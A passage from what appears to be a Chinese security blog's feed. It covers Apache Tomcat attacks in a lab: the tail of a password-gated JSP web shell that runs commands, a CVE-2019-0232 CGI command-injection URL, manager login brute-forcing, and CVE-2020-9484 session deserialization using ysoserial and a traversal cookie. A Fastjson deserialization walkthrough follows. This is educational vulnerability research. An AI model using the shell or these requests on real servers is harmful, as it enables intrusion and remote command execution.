excuteCmd(String c) &#123;StringBuilder line = new StringBuilder();try &#123;Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) &#123;line.append(temp+&quot;\\n&quot;);&#125;buf.close();&#125; catch (Exception e) &#123;line.append(e.getMessage());&#125;return line.toString();&#125;%&gt;&lt;%if(&quot;123&quot;.equals(request.getParameter(&quot;pwd&quot;))&amp;&amp;!&quot;&quot;.equals(request.getParameter(&quot;cmd&quot;)))&#123;out.println(&quot;&lt;pre&gt;&quot;+excuteCmd(request.getParameter(&quot;cmd&quot;))+&quot;&lt;/pre&gt;&quot;);&#125;else&#123;out.println(&quot;:-)&quot;);&#125;%&gt;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230818093200162.png" alt="image-20230818093200162"></p><p>上传成功</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230818093255540.png" alt="image-20230818093255540"></p><p>访问木马所在的目录</p><pre><code>http://192.168.79.147:8080/shell/shell.jsp?pwd=123&amp;&amp;cmd=id</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230818093502935.png" alt="image-20230818093502935"></p><h2 id="CVE-2019-0232-远程代码执行"><a href="#CVE-2019-0232-远程代码执行" class="headerlink" title="CVE-2019-0232(远程代码执行)"></a>CVE-2019-0232(远程代码执行)</h2><p>影响范围</p><ul><li>Apache Tomcat 9.0.0.M1 to 9.0.17</li><li>Apache Tomcat 8.5.0 to 8.5.39</li><li>Apache Tomcat 7.0.0 to 7.0.93</li></ul><p>条件：</p><p>该漏洞是由于Tomcat CGI将命令行参数传递给Windows程序的方式存在错误，使得CGIServlet被命令注入影响。</p><p>该漏洞只影响Windows平台，要求启用了CGIServlet和enableCmdLineArguments参数。但是CGIServlet和enableCmdLineArguments参数默认情况下都不启用。</p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>这里使用的是tomcat 9.0.10 + jdk 17</p><p>首先进行CGI相关的配置，在 <code>conf/web.xml</code> 中启用CGIServlet：</p><pre><code class="xml">&lt;servlet&gt;    &lt;servlet-name&gt;cgi&lt;/servlet-name&gt;    &lt;servlet-class&gt;org.apache.catalina.servlets.CGIServlet&lt;/servlet-class&gt;    &lt;init-param&gt;      &lt;param-name&gt;cgiPathPrefix&lt;/param-name&gt;      &lt;param-value&gt;WEB-INF/cgi-bin&lt;/param-value&gt;    &lt;/init-param&gt;    &lt;init-param&gt;      &lt;param-name&gt;enableCmdLineArguments&lt;/param-name&gt;      &lt;param-value&gt;true&lt;/param-value&gt;    &lt;/init-param&gt;    &lt;init-param&gt;      &lt;param-name&gt;executable&lt;/param-name&gt;      &lt;param-value&gt;&lt;/param-value&gt;    &lt;/init-param&gt;    &lt;load-on-startup&gt;5&lt;/load-on-startup&gt;&lt;/servlet&gt;</code></pre><p>这里主要的设置是 <code>enableCmdLineArguments</code> 和 <code>executable</code> 两个选项。 <code>enableCmdLineArguments</code> 启用后才会将Url中的参数传递到命令行， <code>executable</code> 指定了执行的二进制文件，默认是 <code>perl</code>，需要置为空才会执行文件本身。</p><p>同样在 <code>conf/web.xml</code> 中启用cgi的servlet-mapping</p><pre><code class="xml">&lt;servlet-mapping&gt;    &lt;servlet-name&gt;cgi&lt;/servlet-name&gt;    &lt;url-pattern&gt;/cgi-bin/*&lt;/url-pattern&gt;&lt;/servlet-mapping&gt;</code></pre><p>之后修改 <code>conf/context.xml</code> 的 <code>&lt;Context&gt;</code> 添加 <code>privileged=&quot;true&quot;</code>属性，否则会没有权限</p><pre><code class="xml">&lt;Context privileged=&quot;true&quot;&gt;    &lt;!-- Default set of monitored resources. If one of these changes, the    --&gt;    &lt;!-- web application will be reloaded.                                   --&gt;    &lt;WatchedResource&gt;WEB-INF/web.xml&lt;/WatchedResource&gt;    &lt;WatchedResource&gt;WEB-INF/tomcat-web.xml&lt;/WatchedResource&gt;    &lt;WatchedResource&gt;$&#123;catalina.base&#125;/conf/web.xml&lt;/WatchedResource&gt;    &lt;!-- Uncomment this to disable session persistence across Tomcat restarts --&gt;    &lt;!--    &lt;Manager pathname=&quot;&quot; /&gt;    --&gt;&lt;/Context&gt;</code></pre><p>然后在 <code>ROOT\WEB-INF</code> 下创建 <code>cgi-bin</code> 目录, 并在该目录下创建一个 <code>1.bat</code> 文件,内容随意，例如<code>echo 1</code></p><p>配置完成后，启动tomcat，访问 <code>http://127.0.0.1:8080/cgi-bin/1.bat?&amp;C%3A%5CWindows%5CSystem32%5Cipconfig.exe</code> ，可以看到命令执行成功</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230818113348655.png" alt="image-20230818113348655"></p><p>注意： &amp;后面执行的命令要使用绝对路径(这里要url编码)，如果命令有参数，使用<code>+</code>号代替空格 —–后面有解释</p><h3 id="调试分析-1"><a href="#调试分析-1" class="headerlink" title="调试分析"></a>调试分析</h3><p>这请求会在org.apache.catalina.servlets.CGIServlet这个Servlet处理，</p><p>因为是get的请求，所有会调用doGet(), 在这个方法中先new一个<code>CGIEnvironment</code>对象</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230818163132849.png" alt="image-20230818163132849"></p><p>跟进构造方法</p><pre><code class="java">protected CGIEnvironment(HttpServletRequest req, ServletContext context) throws IOException &#123;    this.setupFromContext(context);    this.setupFromRequest(req);    this.valid = this.setCGIEnvironment(req);    if (this.valid) &#123;        this.workingDirectory = new File(this.command.substring(0, this.command.lastIndexOf(File.separator)));    &#125; else &#123;        this.workingDirectory = null;    &#125;&#125;</code></pre><p>第二行调用了setupFromRequest()方法，跟进</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230818163755929.png" alt="image-20230818163755929"></p><p>这里又看到了<code>javax.servlet.include.*</code>, 估计可以使用AJP协议来利用这个漏洞，但没必要这么麻烦，这里走的是else的分支</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230818164046704.png" alt="image-20230818164046704"></p><p>往下很重要</p><pre><code class="java">if (CGIServlet.this.enableCmdLineArguments &amp;&amp; (req.getMethod().equals(&quot;GET&quot;) || req.getMethod().equals(&quot;POST&quot;) || req.getMethod().equals(&quot;HEAD&quot;))) &#123;    String qs;    if (isIncluded) &#123;        qs = (String)req.getAttribute(&quot;javax.servlet.include.query_string&quot;);    &#125; else &#123;        qs = req.getQueryString();    &#125;    if (qs != null &amp;&amp; qs.indexOf(61) == -1) &#123;        StringTokenizer qsTokens = new StringTokenizer(qs, &quot;+&quot;);        while(qsTokens.hasMoreTokens()) &#123;            this.cmdLineParameters.add(URLDecoder.decode(qsTokens.nextToken(), CGIServlet.this.parameterEncoding));        &#125;    &#125;&#125;</code></pre><p>首先检查是否开启了<code>enableCmdLineArguments</code>,这个在搭建环境的时候在web.xml开启了 ，然后查看请求方法是否为GET&#x2F;POST&#x2F;HEAD</p><p>如果满足条件进入if语句</p><p>进入if后，通过qs &#x3D; req.getQueryString()给qs赋值赋值，这个qs是获取get方法的请求参数，就是<code>?</code>后面的所有东西</p><pre><code>qs = &amp;C%3A%5CWindows%5CSystem32%5Ccalc.exe</code></pre><p>往下又一个if语句，这里判断的是qs是否不为空并且qs里面不能存在<code>=</code>号，满足条件进入if语句 ，创建StringTokenizer对象，通过<code>+</code>号来分割出命令和参数，然后<code>urldecode</code>后添加到<code>cmdLineParameters</code>这个数组对象中</p><p>返回到doGet方法进入if语句</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230818170340103.png" alt="image-20230818170340103"></p><p>先new一个<code>CGIRunner</code>对象</p><pre><code class="java">protected CGIRunner(String command, Hashtable&lt;String, String&gt; env, File wd, ArrayList&lt;String&gt; params) &#123;    this.command = command;    this.env = env;    this.wd = wd;    this.params = params;    this.updateReadyStatus();&#125;</code></pre><p>在这里设置了执行的命令，参数，环境，和运行目录</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230818171213829.png" alt="image-20230818171213829"></p><p>往下执行<code>cgi.run()</code>,跟进</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230818171540581.png" alt="image-20230818171540581"></p><p>这里会判断command中是否存在<code>\.\</code>或者<code>\..</code>或<code>..\</code> ,如果不存在则进入if语句</p><p>往下就是构造号参数，执行命令</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230818171931833.png" alt="image-20230818171931833"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230818172052777.png" alt="image-20230818172052777"></p><p>public Process exec(String[] cmdarray,String[] envp,File dir)—-在指定环境和工作目录的独立进程中执行指定的命令和变量</p><p>因为这里指定了环境，在指定的环境中没又系统环境变量，不能执行执行<code>calc</code> ,要使用这个命令的文件绝对路径</p><p>这里的<code>&amp;</code>就相当于命令拼接，也可以使用<code>&amp;&amp;</code>或<code>|</code></p><p>为什么这个漏洞只能在windows系统实现，参考<a href="https://xz.aliyun.com/t/4875#toc-1">https://xz.aliyun.com/t/4875#toc-1</a></p><p>总的来说就行命令执行底层的实现不一样，</p><h2 id="manager-App暴力破解"><a href="#manager-App暴力破解" class="headerlink" title="manager App暴力破解"></a>manager App暴力破解</h2><p>访问后台登录页&#x2F;manager&#x2F;html，输入账号密码抓包</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230818180539189.png" alt="image-20230818180539189"></p><p>base64解密发现是账号密码</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230818180626306.png" alt="image-20230818180626306"></p><p>然后就可以根据这个规则进行爆破账号密码了</p><h2 id="CVE-2020-9484-session反序列化漏洞"><a href="#CVE-2020-9484-session反序列化漏洞" class="headerlink" title="CVE-2020-9484(session反序列化漏洞)"></a>CVE-2020-9484(session反序列化漏洞)</h2><p>影响版本：</p><ul><li><p>Apache Tomcat 10.0.0-M1—10.0.0-M4</p></li><li><p>Apache Tomcat 9.0.0.M1—9.0.34</p></li><li><p>Apache Tomcat 8.5.0—8.5.54</p></li><li><p>Apache Tomcat 7.0.0—7.0.103</p></li></ul><p>环境搭建：</p><p>修改tomcat路径conf目录下的context.xml 在<code>&lt;Context&gt;</code>标签内加入以下配置</p><pre><code class="xml">&lt;Manager className=&quot;org.apache.catalina.session.PersistentManager&quot;       debug=&quot;0&quot;      saveOnRestart=&quot;false&quot;      maxActiveSession=&quot;-1&quot;      minIdleSwap=&quot;-1&quot;      maxIdleSwap=&quot;-1&quot;      maxIdleBackup=&quot;-1&quot;&gt;      &lt;Store className=&quot;org.apache.catalina.session.FileStore&quot;/&gt;  &lt;/Manager&gt;</code></pre><p>为了方便burp抓包，修改server.xml端口为80</p><p>漏洞代码如下：</p><p>在<code>org.apache.catalina.session.FileStore</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230821112724329.png" alt="image-20230821112724329"></p><p>这里对file的内容进行了反序列化，file是由参数id确定的，而id是Cookie中的JSESSIONID，即tomcat的sessionid</p><p>设置Cookie 调试</p><pre><code class="http">Cookie: JSESSIONID=aaa</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230821113910805.png" alt="image-20230821113910805"></p><p>可以看到id&#x3D;aaa，跟进这个file()</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230821114049416.png" alt="image-20230821114049416"></p><p>这里获取文件名，文件名是id拼接了<code>.session</code> </p><p>返回的文件路径是拼接的，在当前路径ROOT下拼接文件名，这里可以目录穿越</p><p>返回后还要检查文件是否存在，才能进行后面的反序列化操作</p><pre><code class="java">if (file != null &amp;&amp; file.exists()) &#123;    Context context = this.getManager().getContext();    Log contextLog = context.getLogger();    ...</code></pre><p>思路是找到利用链，生成序列化后的文件为xxx.session文件，然后通过<code>JSESSIONID</code>指定路径进行反序列化触发利用链</p><p>利用链的寻找要根据具体的情况来定，这里使用URLDNS这条链来测试,直接利用ysoserial生成</p><pre><code class="java">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS &quot;http://3ceda1c3.dnslog.click.&quot; &gt; test.session</code></pre><p>然后将test.session放到<code>\work\Catalina\localhost\temp\sessions</code>下，ROOT和temp是同级目录</p><p>然后设置Cookie</p><pre><code>JSESSIONID=../temp/sessions/test</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230821120512968.png" alt="image-20230821120512968"></p><p>获取到正确路径进入if语句执行了反序列化</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230821120700453.png" alt="image-20230821120700453"></p><p>结果如下：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230821120801201.png" alt="image-20230821120801201"></p><p>URLDNS利用链被利用说明存在反序列化漏洞</p><p>修复：在 <a href="https://github.com/apache/tomcat/commit/3aa8f28db7efb311cdd1b6fe15a9cd3b167a2222#diff-d7c9b18d315c5a1fb1e71831656064ad">java&#x2F;org&#x2F;apache&#x2F;catalina&#x2F;session&#x2F;FileStore.java</a> 中判断了目录是否有效</p><p><img src="https://y4er.com/img/uploads/20200525101938.png" alt="image.png"></p><p>总结：</p><p>利用难度大，不是默认配置，需要手动修改配置，还有文件后缀为.session  ,还需要执行.session文件路径</p>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fastjson系列</title>
      <link href="/2023/08/15/Fastjson%E7%B3%BB%E5%88%97/"/>
      <url>/2023/08/15/Fastjson%E7%B3%BB%E5%88%97/</url>
      
        <content type="html"><![CDATA[<h1 id="FastJson系列"><a href="#FastJson系列" class="headerlink" title="FastJson系列"></a>FastJson系列</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>环境搭建：</p><pre><code class="xml">    &lt;dependency&gt;      &lt;groupId&gt;com.alibaba&lt;/groupId&gt;      &lt;artifactId&gt;fastjson&lt;/artifactId&gt;      &lt;version&gt;1.2.24&lt;/version&gt;    &lt;/dependency&gt;</code></pre><p>如果无法下载源码使用下面命令：</p><pre><code>mvn dependency:resolve -Dclassifier=sources</code></pre><h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><p>先写一个javabean:</p><pre><code class="java">package org.example;public class user &#123;    private String name;    private int age;    public user() &#123;        System.out.println(&quot;调用构造函数&quot;);    &#125;    public String getName() &#123;        System.out.println(&quot;调用getName&quot;);        return name;    &#125;    public void setName(String name) &#123;        System.out.println(&quot;调用setName&quot;);        this.name = name;    &#125;    public int getAge() &#123;        System.out.println(&quot;调用getAge&quot;);        return age;    &#125;    public void setAge(int age) &#123;        System.out.println(&quot;调用setAge&quot;);        this.age = age;    &#125;&#125;</code></pre><p>然后使用<code>com.alibaba.fastjson.JSON</code>将user对象序列化为json字符串</p><pre><code class="java">public static void main( String[] args )    &#123;        user A =  new user();        A.setAge(18);        A.setName(&quot;Tree&quot;);        String s = JSON.toJSONString(A);        System.out.println(s);&#125;</code></pre><p>输出：</p><pre><code class="java">调用构造函数  //user A =  new user();调用setAge  //A.setAge(18);调用setName //A.setName(&quot;Tree&quot;);调用getAge 调用getName&#123;&quot;age&quot;:18,&quot;name&quot;:&quot;Tree&quot;&#125;</code></pre><p>可以看到，使用<code>toJSONString(A)</code>的时候，会自动调用user类的getter方法</p><p>同样的，如果使用<code>toJSONString(A, SerializerFeature.WriteClassName)</code></p><pre><code class="java">public static void main( String[] args )    &#123;        user A =  new user();        A.setAge(18);        A.setName(&quot;Tree&quot;);        String s = JSON.toJSONString(A, SerializerFeature.WriteClassName);        System.out.println(s);&#125;</code></pre><p>输出结果：</p><pre><code class="java">调用构造函数调用setAge调用setName调用getAge调用getName&#123;&quot;@type&quot;:&quot;org.example.user&quot;,&quot;age&quot;:18,&quot;name&quot;:&quot;Tree&quot;&#125;</code></pre><p><code>SerializerFeature.WriteClassName</code>是<code>toJSONString</code>设置的一个属性值，设置之后在序列化的时候会多写入一个<code>@type</code>，即写上被序列化的类名</p><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>上面是利用<code>JSON.toJSONString</code>进行序列化，反序列化是利用<code>parse()</code>或<code>parseObject()</code></p><p>其实这个<code>parseObject()</code>也是调用了parse()，只是多出了一个JSON.toJSON()处理</p><pre><code class="java">public static JSONObject parseObject(String text) &#123;        Object obj = parse(text);        if (obj instanceof JSONObject) &#123;            return (JSONObject) obj;        &#125;        return (JSONObject) JSON.toJSON(obj);    &#125;</code></pre><p>先看看这两个方法的区别</p><pre><code class="java">public static void main( String[] args )    &#123;      String jsonstr1 = &quot;&#123;\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;Tree\&quot;&#125;&quot;;      System.out.println(JSON.parse(jsonstr1));      System.out.println(JSON.parseObject(jsonstr1));      System.out.println(JSON.parseObject(jsonstr1, user.class));&#125;</code></pre><p>输出：</p><pre><code>&#123;&quot;name&quot;:&quot;Tree&quot;,&quot;age&quot;:18&#125;&#123;&quot;name&quot;:&quot;Tree&quot;,&quot;age&quot;:18&#125;调用构造函数调用setAge调用setNameorg.example.user@1a7e7ff</code></pre><p>可以看到，当要处理的json字符串为<code>&#123;&quot;age&quot;:18,&quot;name&quot;:&quot;Tree&quot;&#125;</code>时，parse(jsonstr1)和parseObject(jsonstr1)执行效果是一样的，如果使用parseObject(jsonstr1, user.class)指定class时，会自动调用这个类的setter方法和构造函数</p><p>当要处理的字符串为<code>&#123;&quot;@type&quot;:&quot;org.example.user&quot;,&quot;age&quot;:18,&quot;name&quot;:&quot;Tree&quot;&#125;</code>时</p><pre><code class="java">public static void main( String[] args )    &#123;      String jsonstr2 = &quot;&#123;\&quot;@type\&quot;:\&quot;org.example.user\&quot;,\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;Tree\&quot;&#125;&quot;;      System.out.println(JSON.parse(jsonstr2));      System.out.println(JSON.parseObject(jsonstr2));      System.out.println(JSON.parseObject(jsonstr2, user.class));&#125;</code></pre><p>输出：</p><pre><code class="java">调用构造函数调用setAge调用setNameorg.example.user@1ef04b5调用构造函数调用setAge调用setName调用getAge调用getName&#123;&quot;name&quot;:&quot;Tree&quot;,&quot;age&quot;:18&#125;调用构造函数调用setAge调用setNameorg.example.user@d6993a</code></pre><p>可以看到使用parse处理，会调用<code>org.example.user</code>这个类的构造函数和setter方法，而<code>parseObject</code>是构造方法，setter和getter方法都调用，如果<code>parseObject</code>添加了 指定的类，就只是调用构造方法和set方法 </p><p>还可以发现@type的作用是用来指定解析类的</p><h3 id="反序列化流程"><a href="#反序列化流程" class="headerlink" title="反序列化流程"></a>反序列化流程</h3><p>这里使用parseObject进行调试，因为这个方法里面已经调用 了parse()方法了</p><pre><code class="java">String jsonstr2 = &quot;&#123;\&quot;@type\&quot;:\&quot;org.example.user\&quot;,\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;Tree\&quot;&#125;&quot;;System.out.println(JSON.parseObject(jsonstr2));</code></pre><p>首先来到<code>parseObject()</code>方法</p><pre><code class="java">public static JSONObject parseObject(String text) &#123;        Object obj = parse(text);        if (obj instanceof JSONObject) &#123;            return (JSONObject) obj;        &#125;        return (JSONObject) JSON.toJSON(obj);    &#125;</code></pre><p>跟进<code>parse(text)</code></p><pre><code class="java">public static Object parse(String text) &#123;        return parse(text, DEFAULT_PARSER_FEATURE);    &#125;</code></pre><p>继续跟进</p><pre><code class="java">public static Object parse(String text, int features) &#123;        if (text == null) &#123;            return null;        &#125;        DefaultJSONParser parser = new DefaultJSONParser(text, ParserConfig.getGlobalInstance(), features);        Object value = parser.parse();        parser.handleResovleTask(value);        parser.close();        return value;    &#125;</code></pre><p>在这里发现，创建了一个<code>DefaultJSONParser</code>对象,构造函数如下， 跟进字符串开头进行设置token,当前开头为<code>&#123;</code>,所以token&#x3D;JSONToken.LBRACE</p><pre><code class="java">public DefaultJSONParser(final Object input, final JSONLexer lexer, final ParserConfig config)&#123;        this.lexer = lexer;        this.input = input;        this.config = config;        this.symbolTable = config.symbolTable;        int ch = lexer.getCurrent();        if (ch == &#39;&#123;&#39;) &#123;            lexer.next();            ((JSONLexerBase) lexer).token = JSONToken.LBRACE;        &#125; else if (ch == &#39;[&#39;) &#123;            lexer.next();            ((JSONLexerBase) lexer).token = JSONToken.LBRACKET;        &#125; else &#123;            lexer.nextToken(); // prime the pump        &#125;    &#125;</code></pre><p>然后调用了它的<code>parse()</code>方法，真正的解析是在这里</p><p>跟进这个parse()方法</p><pre><code class="java">public Object parse() &#123;        return parse(null);    &#125;</code></pre><p>继续跟进</p><pre><code class="java">public Object parse(Object fieldName) &#123;        final JSONLexer lexer = this.lexer;        switch (lexer.token()) &#123;                ....                              case LBRACE:                JSONObject object = new JSONObject(lexer.isEnabled(Feature.OrderedField));                return parseObject(object, fieldName);                                         ....                        &#125;&#125;</code></pre><p>这个解析函数会跟据刚刚构造函数设置的token进入不同的分支，这里就进入了<code>LBRACE</code>分支，跟进<code>parseObject(object, fieldName)</code></p><p>在这个parseObject中，前面会解析出key值，再通过if判断是否为<code>@type</code>,如果是并且满足<code>!lexer.isEnabled(Feature.DisableSpecialKeyDetect)</code>,大概就是没有禁用特殊键检测，则进入if语句</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230804093612224.png" alt="image-20230804093612224"></p><p>进入if语句后，首先通过<code>lexer.scanSymbol(symbolTable, &#39;&quot;&#39;)</code>获取@type对应的value，也就是指定的类名，然后在通过<code>TypeUtils.loadClass</code>加载这个类</p><p>loadClass的代码如下：</p><pre><code class="java">public static Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;        if (className == null || className.length() == 0) &#123;            return null;        &#125;        Class&lt;?&gt; clazz = mappings.get(className);        if (clazz != null) &#123;            return clazz;        &#125;        if (className.charAt(0) == &#39;[&#39;) &#123;            Class&lt;?&gt; componentType = loadClass(className.substring(1), classLoader);            return Array.newInstance(componentType, 0).getClass();        &#125;        if (className.startsWith(&quot;L&quot;) &amp;&amp; className.endsWith(&quot;;&quot;)) &#123;            String newClassName = className.substring(1, className.length() - 1);            return loadClass(newClassName, classLoader);        &#125;        try &#123;            if (classLoader != null) &#123;                clazz = classLoader.loadClass(className);                mappings.put(className, clazz);                return clazz;            &#125;        &#125; catch (Throwable e) &#123;            e.printStackTrace();            // skip        &#125;        try &#123;            ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();            if (contextClassLoader != null) &#123;                clazz = contextClassLoader.loadClass(className);                mappings.put(className, clazz);                return clazz;            &#125;        &#125; catch (Throwable e) &#123;            // skip        &#125;        try &#123;            clazz = Class.forName(className);            mappings.put(className, clazz);            return clazz;        &#125; catch (Throwable e) &#123;            // skip        &#125;        return clazz;    &#125;</code></pre><p>首先，检查 className 是否为空或长度为零。如果是，则返回 null。</p><p>接着，尝试从 mappings（一个缓存）中获取已加载的类对象。如果找到了，则直接返回。</p><p>如果 className 是一个数组类型（以 “[“ 开头），则递归调用 loadClass 方法来加载数组元素类型的类对象，并通过 Array.newInstance 创建一个长度为 0 的数组实例，最后返回其类对象。</p><p>如果 className 以 “L” 开头并以 “;” 结尾，说明它是一个带有包名的类名，去除首尾的字符后递归调用 loadClass 方法来加载真实的类对象，并返回。</p><p>如果以上条件都不满足，则尝试通过提供的 classLoader 加载类对象。如果 classLoader 不为空，则使用它来加载类，并将加载的类对象保存到 mappings 中，然后返回。</p><p>如果使用 classLoader 加载失败，则尝试使用当前线程的上下文类加载器（contextClassLoader）加载类对象，并将加载的类对象保存到 mappings 中，然后返回。</p><p>如果前面的步骤都失败，则使用 Class.forName 方法加载指定名称的类对象，并将加载的类对象保存到 mappings 中，最后返回。</p><p>如果所有的尝试都失败了，最后返回 null。</p><p>回到parseObject中</p><pre><code class="java">ObjectDeserializer deserializer = config.getDeserializer(clazz);return deserializer.deserialze(this, clazz, fieldName);</code></pre><p>这个是进入if判断的结尾，根据加载得到clazz获取反序列化器</p><p>跟进<code>getDeserializer</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230804101023264.png" alt="image-20230804101023264"></p><p>这里存在一个黑名单限制可以反序列化的类，黑名单里面只有Thread</p><p>然后往下，运行到</p><pre><code class="java">derializer = createJavaBeanDeserializer(clazz, type);</code></pre><p>跟进createJavaBeanDeserializer方法,里面会调用JavaBeanInfo.build()</p><pre><code class="java">JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, type, propertyNamingStrategy);</code></pre><p>跟进这个build</p><p>在这个方法中，会通过反射获取clazz这个类的属性值和方法名,然后就是对setter和getter方法的处理和判断：</p><p>setter自动调用需要满足以下条件：</p><ul><li>方法名长度大于4</li></ul><pre><code class="java">if (methodName.length() &lt; 4) &#123;                continue;            &#125;</code></pre><ul><li>非静态方法</li></ul><pre><code class="java">if (Modifier.isStatic(method.getModifiers())) &#123;                continue;            &#125;</code></pre><ul><li>返回值为void或者当前类</li></ul><pre><code class="java">if (!(method.getReturnType().equals(Void.TYPE) || method.getReturnType().equals(method.getDeclaringClass()))) &#123;                continue;            &#125;</code></pre><ul><li>以set开头且第四个字母为大写</li></ul><pre><code class="java">if (!methodName.startsWith(&quot;set&quot;)) &#123;                 continue;            &#125;            char c3 = methodName.charAt(3);            String propertyName;            if (Character.isUpperCase(c3) //                || c3 &gt; 512 // for unicode method name            ) &#123;&#125;</code></pre><ul><li>参数个数为1个</li></ul><pre><code class="java">Class&lt;?&gt;[] types = method.getParameterTypes();            if (types.length != 1) &#123;                continue;            &#125;</code></pre><p>解析完setter方法后再处理getter方法</p><p>同理：getter自动调用还需要满足以下条件：</p><ul><li>方法名长度大于4</li><li>非静态方法</li><li>以get开头且第四个字母为大写</li><li>无参数传入</li><li>返回值类型继承自Collection || Map || AtomicBoolean || AtomicInteger || AtomicLong</li><li>此getter不能有setter方法（程序会先将目标类中所有的setter加入fieldList列表，因此可以通过读取fieldList列表来判断此类中的getter方法有没有setter）</li></ul><p>解析完后将满足条件的方法添加到fieldList里面</p><pre><code class="java">add(fieldList, new FieldInfo(propertyName, method, field, clazz, type, ordinal, serialzeFeatures, parserFeatures,                                         annotation, fieldAnnotation, null));</code></pre><p>解析完后返回到parseObject()</p><pre><code class="java">ObjectDeserializer deserializer = config.getDeserializer(clazz);return deserializer.deserialze(this, clazz, fieldName);</code></pre><p>在deserializer.deserialze()这里进行了反序列化调用了setter方法，由于调试的时候无法跟进，这里就不分析了</p><p>然后返回到JSON类下的 parseObject()</p><pre><code class="java">public static JSONObject parseObject(String text) &#123;        Object obj = parse(text);        if (obj instanceof JSONObject) &#123;            return (JSONObject) obj;        &#125;        return (JSONObject) JSON.toJSON(obj);    &#125;</code></pre><p>走完了parse()后调用了setter方法，然后再往下调用JSON.toJSON</p><p>运行到这里：</p><pre><code class="java">if (serializer instanceof JavaBeanSerializer) &#123;            JavaBeanSerializer javaBeanSerializer = (JavaBeanSerializer) serializer;                        JSONObject json = new JSONObject();            try &#123;                Map&lt;String, Object&gt; values = javaBeanSerializer.getFieldValuesMap(javaObject);                for (Map.Entry&lt;String, Object&gt; entry : values.entrySet()) &#123;                    json.put(entry.getKey(), toJSON(entry.getValue()));                &#125;            &#125; catch (Exception e) &#123;                throw new JSONException(&quot;toJSON error&quot;, e);            &#125;            return json;        &#125;</code></pre><p>跟进<code>getFieldValuesMap</code>,其中javaObject就是@type指定的类</p><pre><code class="java">public Map&lt;String, Object&gt; getFieldValuesMap(Object object) throws Exception &#123;        Map&lt;String, Object&gt; map = new LinkedHashMap&lt;String, Object&gt;(sortedGetters.length);                for (FieldSerializer getter : sortedGetters) &#123;            map.put(getter.fieldInfo.name, getter.getPropertyValue(object));        &#125;                return map;    &#125;</code></pre><p>这里<code>getter.getPropertyValue</code>直接传入参数object,跟进查看</p><pre><code class="java">public Object getPropertyValue(Object object) throws InvocationTargetException, IllegalAccessException &#123;        Object propertyValue =  fieldInfo.get(object);        if (format != null &amp;&amp; propertyValue != null) &#123;            if (fieldInfo.fieldClass == Date.class) &#123;                SimpleDateFormat dateFormat = new SimpleDateFormat(format);                dateFormat.setTimeZone(JSON.defaultTimeZone);                return dateFormat.format(propertyValue);            &#125;        &#125;        return propertyValue;    &#125;</code></pre><p>继续跟进fieldInfo.get(object)</p><pre><code class="java"> public Object get(Object javaObject) throws IllegalAccessException, InvocationTargetException &#123;        if (method != null) &#123;            Object value = method.invoke(javaObject, new Object[0]);            return value;        &#125;        return field.get(javaObject);    &#125;</code></pre><p>到这里可以看到method.invoke，通过反射调用方法，这里调用的就是getter方法</p><p>然后返回到JSON.toJSON </p><pre><code class="java">try &#123;                Map&lt;String, Object&gt; values = javaBeanSerializer.getFieldValuesMap(javaObject);                for (Map.Entry&lt;String, Object&gt; entry : values.entrySet()) &#123;                    json.put(entry.getKey(), toJSON(entry.getValue()));                &#125;            &#125; catch (Exception e) &#123;                throw new JSONException(&quot;toJSON error&quot;, e);            &#125;            return json;</code></pre><p>然后通过json.put逐渐构建出json对象，返回json</p><p>整个反序列化的过程大概就是这样子了，总的可以知道在处理json字符串的时候<code>parse</code>或<code>parseObject</code>会调用@type指定的类的setter方法给属性赋值，如果要调用getter方法需要使用<code>parseObject</code></p><p>就是这个自动调用的特性，造成了序列化漏洞</p><h3 id="省流"><a href="#省流" class="headerlink" 